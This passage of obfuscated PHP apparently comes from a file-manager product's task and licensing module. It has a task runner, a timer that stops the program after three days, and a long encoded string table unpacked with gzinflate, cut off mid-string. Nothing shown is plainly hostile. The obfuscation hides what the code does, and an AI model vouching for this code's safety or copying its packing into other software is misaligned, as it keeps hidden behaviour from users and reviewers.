$˜«…¼ø = 0; $ƒĞ§©ìğ = 300; if (!$˜«…¼ø) { $˜«…¼ø = time(); } if (time() - $˜«…¼ø < $ƒĞ§©ìğ) { return; } $˜«…¼ø = time(); $¯Â×«ÃĞ = Model($Ë…“†ßé[515])->db($Ë…“†ßé[12]); if ($¯Â×«ÃĞ) { $¯Â×«ÃĞ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ë…“†ßé[1627], $Ë…“†ßé[1628]); die; } } public static function taskRun($…Şªà¾¼) { $æ¿ış‡ =& $_SERVER[Æ š¦İÈ]; self::log($æ¿ış‡[1629] . $…Şªà¾¼[$æ¿ış‡[403]] . $æ¿ış‡[1630] . $…Şªà¾¼[$æ¿ış‡[32]] . $æ¿ış‡[1631] . $…Şªà¾¼[$æ¿ış‡[1632]]); Model($æ¿ış‡[1613])->run($…Şªà¾¼[$æ¿ış‡[403]]); $––‰»Úê = timeFloat(); $ĞÂÇ®è = $æ¿ış‡[12]; switch ($…Şªà¾¼[$æ¿ış‡[33]]) { case $æ¿ış‡[304]: $Ïê¤Âş = url_request($…Şªà¾¼[$æ¿ış‡[1632]], $æ¿ış‡[227], !1, !1, !1, !1, 10); if ($Ïê¤Âş[$æ¿ış‡[747]]) { $ĞÂÇ®è = strlen($Ïê¤Âş[$æ¿ış‡[1182]]); } break; case $æ¿ış‡[226]: $ĞÂÇ®è = Hook::apply($…Şªà¾¼[$æ¿ış‡[1632]]); default: break; } Model($æ¿ış‡[1633])->add(array($æ¿ış‡[1634] => $æ¿ış‡[12], $æ¿ış‡[1635] => $æ¿ış‡[192], $æ¿ış‡[33] => $æ¿ış‡[1636] . $…Şªà¾¼[$æ¿ış‡[403]], $æ¿ış‡[1637] => json_encode(array($æ¿ış‡[32] => $…Şªà¾¼[$æ¿ış‡[32]], $æ¿ış‡[1638] => timeFloat() - $––‰»Úê, $æ¿ış‡[290] => $ĞÂÇ®è)))); $ÅØ•­ºî = $ĞÂÇ®è ? $æ¿ış‡[1639] . $ĞÂÇ®è : $æ¿ış‡[12]; self::log($æ¿ış‡[1640] . $…Şªà¾¼[$æ¿ış‡[403]] . $æ¿ış‡[538] . $ÅØ•­ºî); return !0; } private static function valueGet($Á ²å) { $İÍÉ™İ =& $_SERVER[Æ š¦İÈ]; $¶˜ºêê = $İÍÉ™İ[1641]; $™ã·ë³ = Model($İÍÉ™İ[435])->get($Á ²å, $¶˜ºêê); if (is_null($™ã·ë³)) { Model($İÍÉ™İ[435])->set($İÍÉ™İ[747], $İÍÉ™İ[89], $¶˜ºêê); Model($İÍÉ™İ[435])->set($İÍÉ™İ[1604], $İÍÉ™İ[192], $¶˜ºêê); $™ã·ë³ = Model($İÍÉ™İ[435])->get($Á ²å, $¶˜ºêê); } return $™ã·ë³; } private static function valueSet($—Ìİì, $ëÏí¼ãŸ) { $øñ€×¨ü =& $_SERVER[Æ š¦İÈ]; $¡áˆ¢œ = $øñ€×¨ü[1642]; CacheLock::lock($¡áˆ¢œ); $ÂÆÙ¬€ = Model($øñ€×¨ü[435])->set($—Ìİì, $ëÏí¼ãŸ, $øñ€×¨ü[1641]); CacheLock::unlock($¡áˆ¢œ); return $ÂÆÙ¬€; } protected static function log($Ú´äŒ¿Ê) { write_log($Ú´äŒ¿Ê, $_SERVER[Æ š¦İÈ][1628]); } private static function cacheClear() { $é¶ßèÂ˜ =& $_SERVER[Æ š¦İÈ]; Cache::clearMemory(Model($é¶ßèÂ˜[435])->cacheKey($é¶ßèÂ˜[1641])); Cache::clearMemory(Model($é¶ßèÂ˜[435])->cacheKey($é¶ßèÂ˜[1643])); Model($é¶ßèÂ˜[1613])->cacheClear(); self::closeDatabase(); } } goto BÀ§œ‰íƒ; F§óÊç÷Î: define($_SERVER[Æ š¦İÈ][235], 1); define($_SERVER[Æ š¦İÈ][236], 2); define($_SERVER[Æ š¦İÈ][237], 3); goto eµõã«óÖ; b›ë£Êî£µ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xc6\xa0\x9a\xa6\xdd\xc8", "\x88\xd5\xf7\xb8\xad\xd0"); $_SERVER[Æ š¦İÈ] = explode("\174\4\174\3\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\174\134\125\365\60\105\220\77\210\237\312\42\362\107\340\65\264\115\332\316\222\244\173\332\64\114\46\223\146\350\144\46\314\114".base64_decode('upCE6ZuZl5mXzLw3ee9Ntrai7Ai0oICCRVB2oVBAFllURECt4AoWQURsC4iCiig=').base64_decode('uMB3l3OX92YC/+/3fb/fV2jn3nOXd5dzzz3n3HPPve38b7302E+2HLTlQ1sO/sM=')."\327\157\177\374\256\73\151\170\313\201\350\277\203\150\370\304\13\377\353\0\362\347\310\13\77\337\324\324\263\364\260\205\361\303\267\177\163\247\172\140\347\25\157\177\377\233\77"."\xde\xf1\xcb\x17\x7f\xfc\x8d\x74\x7e\xf5\x3\x3b\xa\x27\x1c\x70\xd6\x7b\x5f\x58\xd0\x86\xb2\xd2\x92\x6d\xf4\x47\x31\x4c\x47\xd1\x26\x75\xdb\xb1\x29\x20\x67\x1a\xc3\x7a\x81\x86\x75\x83\xfe"."\6\351\117\177\62\146\151\145\323\321\150\64\100\177\62\320\52\362\257\75\126\322\131\172\46\236\110\147\122\375\175\175\221\144\32\62\265\311\351\145\63\17\241\212\152\251\145".strrev('1¢šÍUc3dr_czLÆÄ±}"ºfuu5'."\r".'ª³QÕy'."\0".'"†h¬ÅLº¹Ôl³E~ø')."\x12\x4c\x39\xaa\xe5\xa4\xf5\xb2\xc6\x73\x4c\x58\xbc\x5d\x9d\x91\x35\xd1\xb8\x92\x4e\x86\xe2\xa9\x50\x38\x1d\x4d\xc4\x29\x38\x9c\xe8\xed\x8d\xa6\x6b\xe1\xc9\x44\x2c\xd6\x19\xa\xaf\xad\x4d"."\351\113\206\326\364\206\24\324\276\222\226\321\215\141\263\111\331\104\123\66\51\363\151\240\133\327\112\171\32\64\124\326\34\147\252\2\241\64\17\241\151\62\252\245\22\215\304".base64_decode('eSivDavVEoxWlxypWHpZZZ1eq01xKA2oVcfUjRyNRCYdSxVw1NYcmmjNgKpSkVg=').strrev('VÊÑÁªfS(J4q/€*6¾’7·Fà¢2HúÊY£¶«(IW¢dî•pVœ$').base64_decode('DS1Tp7JEsiuSVDo3KmKEcma5bBoBVAuaSUdqaiSZpAEfoHcsiicNIonu7lSEx6A=')."\163\247\306\120\113\26\1\176\272\142\371\341\222\223\31\127\113\125\206\246\243\364\267\21\176\340\327\264\1\165\307\164\103\257\2\232\102\25\246\311\227\25\4\252\54\267\306"."\x20\x5a\x1e\x2\x65\x54\xde\x84\x95\x87\x96\xe1\x38\xd\xb6\xaf\xa6\xbf\x2b\x21\x53\x36\x83\xd3\x34\xcb\xc9\x68\x46\xce\xcc\xeb\x6\x2c\xd6\xe\x40\x3a\xd5\x29\x76\x59\x3a\xca\x0\x35\x99".strrev('/ß0¶-å/Q\\Ñág,µxéRÓèîN\\Tâ%šò–l6ñ‹IzÃ¡Ç5ê™Yœ')."\x27\x5a\xfa\xfa\xf0\x94\x58\x80\xb6\x59\xb5\x72\x5a\x14\x2d\x11\x51\xb6\x8f\xb7\xa4\x5\x32\x69\x8e\x83\x7a\x6b\xb3\x7e\xf5\x57\x4a\xa6\x9a\x4f\x69\x96\xd4\xd7\x6e\x54\x30\x51\x75\x64\x60"."\225\144\353\66\255\162\27\42\25\360\175\264\114\364\376\72\11\243\154\241\344\245\41\14\66\15\174\316\377\356\320\300\311\350\237\371\100\13\7\241\115\105\255\124\312\150\223"."\x1a\xac\xa4\x72\x7e\x89\xcd\x3a\x19\xb4\xb3\xba\x11\x44\x10\x1a\x8d\x26\x32\x45\xd5\x2e\xf6\xe6\x97\x64\x48\x29\x46\x62\xf3\xda\x64\xa0\x52\xac\xc0\x32\xe7\x2b\x7b\xd0\x85\xe9\x78\x5a\xe2"."\xa6\x13\x91\x8\x75\xc9\xcc\xa9\x25\xb9\x8b\x34\x5c\x74\x9c\x4a\x4a\x33\xf2\x78\x24\xa0\x2b\xe6\x84\x41\x46\xaa\xa2\x69\x90\xa9\xcb\xa7\xe4\x95\x5e\x65\xa3\xd2\xd3\xa6\xb7\xd9\xac\x60\xb9".base64_decode('xEOsdxxmc6AzyVAlP0wDWbZPNAANqVRKek51dNMImjlHc/y2Y2kqlA/lcppt+8M=')."\246\341\130\146\311\37\52\225\314\11\177\302\322\13\272\321\246\54\0\132\213\22\321\232\366\143\372\327\6\13\265\141\245\202\321\2\23\201\5\355\125\147\330\277\234\55\100"."\x9e\xdb\x52\xd\x7b\x58\xb3\xfc\x11\x58\x18\x6d\xa\x6a\x1a\x27\x82\x2c\x5b\x97\x6e\x57\x4c\x5b\xc7\xcd\x6b\x53\x54\xc7\x51\x73\x45\x4c\x40\x44\xf5\xed\x8c\x2a\x56\x74\x4b\xb3\xd9\xf7\x95"."\65\275\151\250\10\225\320\374\175\226\132\50\253\155\112\245\232\105\275\205\305\127\7\106\163\103\167\333\224\34\216\372\224\162\325\166\374\226\206\250\213\216\166\60\230\251\350"."\xb0\xbf\x17\xaf\xc\x5d\xcb\xfb\x53\x88\x8\x3\x78\x51\xf3\x62\x5\x4d\xbe\xc2\xd2\x28\xb4\x27\x9d\xee\xcb\x44\xbb\xd1\x2e\x1b\x8f\x64\x7a\x43\xe9\x70\xf\x34\xdb\x51\xb\xac\xcd\x31\x44"."\x5a\x79\x95\xc\xb8\xc1\x8f\x56\x8\x46\x8f\x38\xea\xab\x0\xf6\x99\x13\x9a\x85\x3e\xdc\x39\xd5\xa6\x8c\x9a\xf9\xac\x39\x19\x60\x49\x38\x73\xa\x91\x0\x96\x19\x4f\x61\xc5\xf1\x27\x55\xa3"."\x80\xc7\x27\x3b\xe5\x68\x80\x44\xf6\x78\xc1\x3d\xd8\x31\xcd\x28\x38\x45\x56\x30\x15\x49\xae\x8b\x24\x33\xa9\x44\x77\x7a\x7d\x28\x9\xfb\xb3\x81\x66\x7e\x92\x7d\xa\x57\x5d\xf2\x27\xb5\x3c".base64_decode('Gvqcw8qpFTxqLA9GbzxXLBWjPEuLRdfggeny2yiTX87F6o7pZR233eEpZCTR5r0=')."\x6\x1a\x14\x24\x1d\x6a\x1f\x2c\x2e\x68\x1a\xcc\x2f\x9c\xef\x47\xff\x2e\x98\x3f\x30\xd8\x15\x58\x30\xd4\x11\xd4\x45\x99\x60\x4b\xa0\x45\x69\x6d\x5e\xaa\xf4\x21\x6e\x42\x57\x4b\xa\x74\xba".base64_decode('JkezkljrHhaBoYZpaO8zOHg7khauZ1gpMBk5tT+SSmd6I+meRBd8PRKCUMykS5E=')."\365\166\200\376\14\5\4\251\105\370\20\55\253\5\17\1\306\261\136\323\322\334\20\261\41\254\327\363\214\102\343\150\217\246\27\212\320\167\35\327\226\63\113\246\245\226\60"."\235\142\10\256\61\332\121\320\201\166\0\111\24\221\224\136\256\60\312\345\24\253\345\254\24\4\332\153\43\134\140\73\107\321\344\73\227\151\101\250\55\10\31\347\266\166\63"."\332\33\114\55\102\377\13\102\233\67\313\52\43\133\204\4\151\171\112\203\50\150\201\53\245\107\123\305\126\350\130\216\211\241\226\53\113\257\346\24\115\230\244\202\306\232\124"."\xe5\x6d\x63\xad\xcc\x6b\x25\x8d\x8d\x46\x51\x63\x44\xbb\x19\xb2\xa1\x4d\x87\x8f\xd5\x30\x27\xe0\x88\x19\x43\x50\xb1\x5b\xea\x76\x12\x95\xc4\xcc\x11\x8b\xaf\xc7\xdc\xab\x0\x38\x3c\x6b\x9".base64_decode('7ReJ7AhaSjSe0e1uaV/PmCQNNV4V+fssbViHBWmgGetVrVFWAM2Q2FhwRKqsuz8=')."\26\313\204\23\361\64\342\210\51\144\175\62\232\216\60\34\15\165\145\102\341\76\276\115\212\31\207\14\230\230\324\122\177\12\31\157\205\216\241\346\4\305\246\204\250\163\305"."\64\154\315\237\203\22\202\163\256\111\312\13\252\17\64\105\120\176\17\341\237\364\253\345\151\177\31\15\212\237\67\324\275\143\52\151\171\343\215\302\54\12\102\216\207\21\11".strrev('Ôº*´ú[òŠ¸DbŸZ«îØÃÀ&´K*H~¾±ğY«(6"†@ ¤Kî«l5')."\301\332\303\72\122\56\11\316\316\335\53\277\30\371\164\117\64\276\66\323\233\350\212\304\62\321\70\242\102\351\132\170\177\137\127\210\115\245\14\357\114\244\173\134\320\176\104"."\x87\xd6\x85\x62\x51\x6f\xf6\xc8\x86\x68\x2a\x9d\xaa\x9b\x84\x60\xfd\x11\x4f\xa\x92\xe3\xfa\x92\x91\xee\xe8\x6\x1e\xed\x8e\x46\x62\x5d\xa9\x4c\x38\x14\xee\x11\x79\xe2\xa1\x5e\x88\x64\x86"."\261\44\145\7\335\371\63\210\240\246\270\74\226\31\307\262\45\33\254\214\113\4\312\60\346\76\43\160\10\155\234\32\140\32\164\27\113\264\244\47\40\317\346\314\52\43\367"."\234\355\53\63\32\122\126\141\21\251\154\123\154\242\77\363\225\120\112\161\52\31\116\55\262\123\74\110\272\301\342\210\301\203\357\53\100\334\153\132\220\301\171\72\265\141\116"."\247\353\3\102\303\16\137\363\236\70\102\176\221\206\146\40\104\104\147\204\11\144\106\340\63\72\132\112\226\23\142\315\31\26\142\153\46\201\344\373\20\26\172\63\353\223\211".base64_decode('+BooMFHUWAOiMPxNjJEC2dcRBAtxQSoTgsSgj5hsKLfQn3n0BzF18HHNYKOexbQ=')."\233\355\76\54\60\214\126\3\243\273\146\225\177\55\153\232\45\266\116\21\57\300\11\6\227\235\107\154\206\44\223\214\324\54\144\33\30\354\37\351\304\332\110\74\303\60\213"."\306\44\154\244\0\44\215\46\222\60\40\216\71\312\44\43\232\230\214\244\330\52\267\264\261\252\316\206\53\30\130\10\130\254\241\55\12\76\37\74\175\160\142\141\323\200\177".strrev('p´?Â¿ÙºªÓü„'."\r".'´u66ß˜îÉ©cKÅªù@çEp6!F™8/æ`a')."\60\60\177\41\0\206\66\267\372\26\157\305\31\120\306\216\223\206\320\117\373\140\307\334\101\377\274\317\154\72\171\140\160\250\261\155\341\354\301\300\111\203\23\103\13\346\167"."\xb0\xef\xe4\xaa\x16\x92\xfa\x72\x53\xbc\xa9\xf9\x85\x4d\xa8\x49\x88\x75\xe2\x59\xc\x42\xf2\xa4\xc\x2c\x61\x5a\xaf\x8\xe8\xe6\xa5\x5b\x19\x1c\xcd\xa1\x56\x10\x25\x6\xfc\x83\xb\x87\x3a".strrev('İ³>{Bø0^€èj².¼OPNFª?î¼QxÏpÓşBùä[ú!Ä-ûÈr¤')."\373\346\271\364\167\53\233\310\202\66\311\110\203\61\254\133\200\235\125\103\37\143\132\4\103\33\203\200\351\60\374\316\152\316\204\306\320\3\301\135\161\204\34\114\320\103\111".base64_decode('UqxEmED4AhaIOI5yZNIrGcyBTfBYXjNgng6F3HZOrWgpqYeZTDrUGYtkGIUBSsw=')."\342\204\52\166\162\215\33\352\232\240\250\214\76\344\4\273\116\44\23\130\371\366\130\111\41\204\101\321\54\313\264\332\210\362\321\256\126\60\353\246\240\31\107\143\253\40\11"."\x5c\x69\x5f\xad\xd0\x21\x87\x72\x19\x79\x2\x2a\x2a\xe3\x13\xb0\x6c\xac\x89\x45\x8f\x29\x14\xb4\xa9\x22\x66\xc8\x46\xc\x17\xe3\x7e\x82\x4d\x83\x83\xd5\x1\x2d\x3f\x34\x80\x10\x5f\xf5\xf".base64_decode('D21etHU+4+iDg+gPi4TqqMEynBpm0P4cwO3gCg1XhCfTqGlxFqniYrId01FLrio=')."\322\30\302\110\23\333\270\101\5\100\147\73\46\50\26\336\312\45\375\41\41\247\161\256\42\343\232\14\111\201\205\113\244\64\47\300\163\370\244\304\14\212\273\164\271\355\15"."\214\330\33\150\71\205\245\255\216\52\142\122\123\266\243\225\135\112\107\133\123\255\134\261\273\132\52\71\234\325\57\351\243\360\5\130\53\233\352\345\355\66\55\46\356\56\200".base64_decode('7zYsqJcxahhIOJVxS+yqa0KIf0krTUxBp0TjSmciEYuE4grewGHjQdxBKtIXQrs=')."\26\26\234\123\351\110\222\341\357\60\10\272\121\303\13\341\173\245\226\101\273\164\6\270\112\330\263\72\103\251\150\70\323\27\142\274\220\132\251\4\355\374\250\35\304\15\327".base64_decode('x7WYng1iXRDWVQe4tmQxTG9Ry41m1CxaA0zKqxol3RiVmwA7aZefdXyDPwryHQ8=').base64_decode('6HmGSIgaOwwKqjWIYS7Xh5VJPszm+NB4+rDs5hMihk/o5nzjujZBApzT94EA4HM=')."\124\13\215\3\346\320\41\30\355\362\351\166\27\221\156\310\7\110\22\153\220\123\304\112\227\222\72\345\243\215\213\151\343\132\311\307\232\346\143\55\366\61\351\304\107\244\315".strrev('M$)h€£’ûJÕ™`¯’¢ä8’sáèO’—Œ¸Ãè¼D,ĞÙZ?Vh.')."\323\361\61\361\327\127\53\31\327\37\273\372\115\47\203\355\375\66\114\24\116\252\35\222\17\230\231\332\301\167\113\170\233\151\215\240\51\330\312\166\127\127\36\61\227\2\313"."\x45\xc\x8f\xb6\x8\xad\x13\x4\x3\x77\xa8\x5b\x1d\x97\xd1\xac\x1e\xca\x31\x74\x67\xe8\x29\xb4\xf8\x42\xd7\x2c\x78\x6e\xaf\xac\xeb\xd5\x14\xe3\x8f\xa6\xd5\x42\x4a\xfa\x9c\xa3\x16\xd8\xb7".base64_decode('6qTScFLLTeWEvNwlSeHuGJ8AslLqYXn9ieWYy+fhsEMPZQPJ0JlPqmsVfPD6g54=').strrev('©Ê INVÒ,IåqIV9?¨@\'ËÃÏ½¨9VÈ¶%İ¢üÓ6…¨›z').base64_decode('mxlaJoMzK+Qf01BcdbPhUtpJuoirRp5CNqFtZVN7A/tIg6u4wAV3I3wsqtRiFx4=')."\x6e\x79\x10\xf0\x46\x49\xba\x2f\xb6\x42\x6\x4a\x88\x9d\xb7\xa\x6c\xa6\x6a\x83\xc0\x87\xb5\xe2\x10\xd2\x18\x4c\x4c\xad\x8c\x7c\x64\x7e\xbd\x0\xd6\x2e\xd7\x77\x71\x54\x2c\x1c\x86\x12\xa".base64_decode('/oBPYoww+fCLJSBF4cc98h7E9GzbeKT6dGNKN2TNmYCKnV8wHnghe3R9XTOF6W4=')."\41\64\163\76\320\330\371\360\26\45\61\5\102\55\204\132\117\366\111\321\166\250\311\323\162\106\111\241\323\375\251\110\62\343\131\310\200\370\105\325\22\143\312\50\16\136\366"."\102\37\211\263\210\250\224\155\130\35\27\114\221\253\214\104\67\154\147\212\265\136\16\272\53\245\321\256\231\42\75\134\241\122\57\52\223\44\335\216\361\355\335\35\46\75\115".strrev('¼Ó€+8¶„¢)#ØœChåÜ©N'."\n".'ŠHÉã€Á‰¢J‰ïÚîbvÁ&ÂÇ©X£u›').strrev('9EZZ §ºb1K¬^FÁÆÄŞ%s“Iª–ÔDhiMeŞ6î\'›Éc')."\x32\xb5\x8d\xc2\xc8\x5f\x3f\xde\x6d\x99\x9c\x17\xe7\x7c\x80\x37\x53\x98\x8\xbb\x8e\x3c\xf4\xd2\x26\x2e\xd\x94\x8b\xdf\xa8\x1\x49\x65\xbc\x9c\x87\x7\xea\x89\x7a\xc7\x1b\xb6\x2a\xa\x62"._kodDe('KGWAVSuDzDt2sy0I9tZX0E4izVqnSHisY8y/kfhM2vgFnC7afyFYl1aBJXf8SErb')."\323\60\4\255\42\125\211\174\22\261\44\51\61\223\111\330\170\375\107\362\272\203\41\170\227\63\231\266\134\144\224\116\210\71\114\246\276\144\23\251\231\4\41\161\370\346\272"."\x72\xd6\xdb\xea\x3\xb\xc8\xee\x1c\xa8\x7f\xf0\x8d\x8f\xce\x69\x48\x32\x10\x29\xf3\xb3\x74\x2\xc\xd8\x8e\x59\x11\x29\x52\x94\x26\x4b\x49\xa2\x52\x29\x17\x1f\x68\xd2\xe\x84\xea\x79\xc2"."\xbf\x8a\x81\x22\x79\xa1\x2c\x91\xbe\xe9\x6a\xa\x94\x50\xe\xe9\x14\x27\xda\x15\xb2\x2c\x86\x3e\xb4\x73\x58\xb1\x8f\x80\x32\x8\xd3\xa5\x14\xc3\xfd\x7a\x1b\xd\xad\x3c\x32\x2e\xcc\x3f\x68"."\125\370\303\1\272\22\3\152\76\237\140\307\126\162\270\66\253\254\211\254\137\21\261\305\341\125\111\261\372\331\103\245\222\70\256\367\306\147\54\102\27\235\134\110\206\314\130".base64_decode('rJuIvkwsqwfjMofMULsZaGE84WW03bR0Zu5jBmIjJrR+HO3U4aJuaDbfcC27Hu0=')."\xf8\xff\xcc\xe6\xd6\xce\x1\x5e\x2b\x33\x21\xe\x4e\x93\xb4\xd7\xd8\x20\x6d\xdc\xb5\xbb\x72\x15\xad\x20\x4d\x12\x3\x41\x36\xe3\x8c\xe3\x62\x7d\x92\xa4\xe\x69\xf1\xb8\xf0\x1\x2d\x56\xda"."\x67\xbc\x3d\x44\x13\x68\x31\xd6\xc7\x50\x6f\x3e\x8d\x29\xa9\x9\x9d\x9b\xe4\x5b\x9c\x5c\x8\x61\x14\xe6\x9b\x66\xaa\x93\x25\xf3\xaa\x4\x93\xf5\xd2\xce\x7b\xbf\xfb\xee\x85\x34\x7c\xef\x5f".base64_decode('3/7Hy7fTcLZiT00w04MtB6J/Z9GwsBQ8Z8Nm87gnPrHmueBL37/32ptnP/mlOXc=').strrev('ºí?ãô_¥Ïnö:[?íŸı4¿n\'¾ù°^÷›üwW‡ÿ2şšË–Ô‘òİ')."\203\117\273\366\342\343\257\15\235\71\357\225\373\156\71\341\235\117\76\373\340\326\347\217\327\346\236\171\355\157\256\274\372\67\127\137\371\237\47\177\177\331\147\376\372\150\143"."\xc7\xf4\x5f\xcf\x9a\xfd\xbd\xf\x7d\xf6\x81\xca\x4b\xe1\xed\x37\x1e\xf2\xd3\xef\x1f\xf4\xd7\xa3\xcf\xfb\xac\x7a\xfb\x65\x4f\x1e\x75\xd8\xe8\xdc\xa7\x66\xdd\xfe\xdc\x5b\xc7\xaf\x9e\xb8\xb4"."\xe3\x9b\x47\xd8\xf7\x7c\xff\xbd\x7b\x73\x7\xe\x7c\x6a\xfb\x3b\x17\x1d\x31\xba\xfc\xec\xb3\x8f\xbc\xe0\xb5\x9f\x7f\xf7\x7a\x6b\xd6\xdb\x47\x1d\x39\xb5\x63\x55\xfe\x3b\xcf\xcd\xf9\xe9\xe3"."\x47\x75\xcf\xf9\xfb\xd3\x57\x18\x3b\xef\xce\xbc\xf6\xd6\x3d\xff\x31\xce\x5a\xf4\xfa\xc6\x6d\xb3\xa\xfa\xc4\xde\x17\x8e\xbc\xe8\x89\x2b\xd3\x87\x5e\xff\xd4\x8f\x6e\xb9\xee\x9a\xdf\xfe\xe2".base64_decode('hcylpdV/vPcbW37+2pt3Dl4w7+JnTrjGXDpw3L4bP1l454Q5r6Y+Ev/Fnhs+Of4=').base64_decode('0Nn9b7569plvdd54ye7Lsn/9r0W//duWofO+2rjn759+9bHsqYecs+X5W/XVi/0=')."\333\237\361\137\377\343\352\347\12\207\257\273\360\326\147\357\311\136\152\177\243\174\320\376\113\52\367\335\364\265\325\337\173\356\245\342\341\361\370\257\326\135\370\255\173\72\133".base64_decode('Tirt2HzUr3f2ZZ76S+dTJ+xSd9zemThm02d/evNF166+fVP4/FdOaHnu7IfPi18=')."\36\177\341\250\43\257\173\355\244\331\331\360\23\57\57\372\105\303\11\345\363\167\337\170\300\354\143\16\127\217\134\170\166\317\47\37\34\213\335\171\334\23\303\341\304\45\107"."\277\332\22\67\116\75\156\354\252\357\316\266\217\270\46\174\334\206\233\73\46\316\71\341\273\273\374\67\165\234\371\363\7\146\207\267\75\367\330\227\273\77\234\72\120\335\175".base64_decode('zs+PP+nkTSe+8b3WzslfF0bvvHhr8+HP/nyk7dd3HR42qi8617SPHX9SePUVmy4=').base64_decode('H1p25sSPxz/Ut+GJ73+4c+pDiePP/txY/ltH50Mvtz2oP3vF3ruadn7+8tc+PW8=')."\xf3\xd5\xc7\x3e\xf7\xe4\x35\xdf\xfa\xc8\x5b\xdf\xda\xf6\xd2\xfe\x27\x9e\x3d\xfa\xa0\x59\x97\x1a\x8f\xa4\xce\xed\xdc\xf3\xcd\x1d\x63\x5f\xb8\x7b\xf4\xb6\xc7\x57\x1d\x73\xdb\x13\x83\xd7\x4f".base64_decode('nnL8Y/pHfnz2z5c8d8Oby46/+9g5N0Wu7f7J7qkfXzd56Qv9B/xtV8LZc1bb5/4=')."\xd6\x76\xd3\x21\xfa\x9f\x3b\x7f\x75\xcc\x55\xeb\xfe\xfa\xd2\x5f\x2f\x51\x1f\x59\x67\xde\xf5\xdd\x8b\xae\xf\x5f\x7b\x50\x5e\xcb\xcf\xce\xcd\xaa\x9a\x2f\xfd\x63\xf0\xda\x47\xf7\xec\xf6\x35"."\x7f\xe5\xcf\x47\x1d\xb6\xe3\xb5\x3d\x2d\x3b\xbf\x76\xff\x89\xc9\x91\x15\x8f\x7e\xf5\xfc\x75\x47\xbe\xdd\xf4\xb5\x2b\x7b\xe\x58\xd5\x32\xf7\xde\xc9\xd6\x1b\x6\x66\x1f\xf1\xaf\x49\xdf\x89"."\35\331\25\237\77\346\361\43\257\71\367\226\133\217\370\305\254\105\173\234\334\235\367\365\234\365\342\301\317\235\364\307\357\56\373\105\316\367\357\3\276\347\174\352\27\163\142"."\227\253\377\275\376\13\37\275\364\206\145\77\172\270\73\62\372\245\177\15\214\331\163\257\132\376\306\121\107\154\177\166\310\216\37\351\234\375\25\353\314\357\34\374\320\317\226"."\164\237\175\330\215\113\257\271\350\262\117\67\37\176\364\57\262\333\77\171\307\205\245\67\156\271\341\321\157\337\160\327\202\102\361\262\261\305\13\176\72\62\65\153\336\331\335"."\117\377\346\361\257\256\63\226\16\234\167\332\165\217\115\235\167\317\107\167\76\67\362\326\61\273\77\172\340\123\315\57\75\166\355\221\227\304\314\123\347\135\76\153\326\200\235".base64_decode('/t6bT3de23ti45M9xR8cPD04dWliU7O5/MaPv3NOc9+Gr35+7Vt//+WbH/1z7Mw=')."\75\367\336\371\305\147\356\134\131\70\376\221\363\157\374\304\221\316\103\177\376\376\315\177\130\174\127\144\337\51\323\217\166\207\243\231\201\354\245\235\237\373\314\57\272\217\111"."\xcc\x7e\xf6\xcb\xbf\xdd\xd5\xf6\xbd\xa5\x87\x1f\xf6\xf3\x8f\xee\x5e\x7a\xfd\xa6\x43\x9e\xfa\xd0\xae\xa9\xdf\xce\x3e\xe2\xe9\x2f\x8d\xee\x7e\x6a\x22\xd8\x6f\x2e\x5d\x38\xb9\xe2\xdc\x27\x27"."\127\76\162\365\61\333\217\76\60\27\110\315\375\312\223\106\250\263\171\152\355\37\377\356\77\166\313\355\307\315\337\175\376\274\216\344\265\15\137\171\352\226\313\77\364\277\76"."\21\177\343\233\337\370\165\150\347\163\251\77\175\374\163\363\346\34\261\161\340\77\237\31\170\355\231\77\334\143\354\134\270\370\123\263\236\270\364\312\333\356\374\325\153\213\156".base64_decode('G718519fOH3nsU9cdMBXD+s/u/rZ8UeW/+hYc9abj/xpS3zNnmPm3fbp3/6m5eQ=')."\xa7\x97\x1f\x7b\xf1\xa3\x8f\x75\xce\xba\x60\xc1\x3d\x47\xdd\xb2\x35\xb3\xe3\x89\x27\x7f\xdf\xfb\x52\xb2\xf2\x93\xad\x2f\x74\x2c\x3e\xeb\xc2\x2b\x1e\xba\xf3\x92\x81\xec\x63\xc7\x3e\xbf\xfd".strrev('¾_øì­à»Ÿôæ«Áäp>7çÎàmáfºOU÷!êıÚßÓ{~§ãS±ÇzŞ>ŸÕ').base64_decode('UjjmjHf3PX3rdzIPf2b6nV/d9NtVZ4y99c+3Hlx/x3dWnfHOHW9+7PTBLf+8b/c=')."\227\356\10\274\367\366\255\7\257\370\213\261\375\235\107\336\170\317\71\371\365\377\370\136\137\346\237\376\331\331\27\34\332\164\201\222\130\171\111\353\1\333\107\147\51\137\370"."\335\35\207\354\374\352\37\315\374\243\107\73\155\7\56\75\350\67\257\74\76\353\300\177\56\377\101\333\332\337\315\176\372\7\147\174\344\276\273\3\305\263\57\250\176\370\310"."\255\273\66\134\374\363\53\222\321\257\155\250\174\341\277\216\116\66\75\265\67\360\354\157\277\24\11\317\135\166\360\255\207\234\273\142\152\307\164\101\337\67\271\357\365\273\326"."\x1d\xf1\xa7\x3b\xaf\xc\xee\xdd\xf6\xa5\x75\x57\x4c\xdc\xfb\xda\xc3\x23\x3f\x5c\x1c\xff\xc2\xc1\x5d\x6f\x96\x12\xc7\xfd\xf0\x80\xbd\xbb\xa2\xc1\x75\xf7\xf8\x4e\xfc\x7a\xd3\x4d\x9f\x3a\xe9"."\216\43\36\70\171\357\326\337\117\267\177\154\350\306\13\76\175\325\21\217\137\237\274\353\371\135\201\245\355\233\136\177\53\362\263\117\374\263\341\343\177\73\262\124\110\353\367"."\227\366\164\135\277\361\312\351\67\337\314\375\372\315\241\143\216\274\152\361\307\272\47\137\174\142\317\117\117\330\345\273\356\251\103\355\155\273\126\276\120\35\70\375\321\155\333"."\x76\xf\xef\xf9\xc9\x3f\x6\x1f\x7a\xf9\x90\xc6\xe0\xba\x7b\xbb\xbe\xf3\xf5\xb\x7e\x7f\xd8\x6b\xc7\x6e\x3d\xfd\x9e\xc6\x43\x1a\xf3\x57\x3c\xf9\xb7\xab\xde\xdd\xf4\x8d\x2f\x9e\xb7\xef\xd7"."\xa7\x6e\xdd\x35\x74\xca\x23\xcf\x3e\xab\xfe\xe4\x8d\x74\xdb\xdd\xff\xee\x1e\xfd\